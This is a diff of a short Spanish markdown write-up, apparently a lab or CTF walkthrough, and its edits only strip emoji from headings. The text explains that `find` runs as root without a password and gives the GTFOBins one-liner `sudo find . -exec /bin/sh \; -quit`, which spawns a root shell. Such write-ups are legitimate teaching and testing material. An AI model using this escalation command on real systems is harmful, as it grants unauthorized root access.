@@ -25,10 +25,10 @@ Eso significa que puedes ejecutar **`find` como root sin contraseña**.
 
 ---
 
-## 🔥 Explotación usando `find` (**GTFOBins**)
+Explotación usando `find` (**GTFOBins**)
 
 El binario `find` permite ejecutar comandos usando `-exec`, lo que nos permite spawnear una shell como root.
 
-### 💣 Método directo (más común)
+Método directo (más común)
 
 sudo find . -exec /bin/sh \; -quit
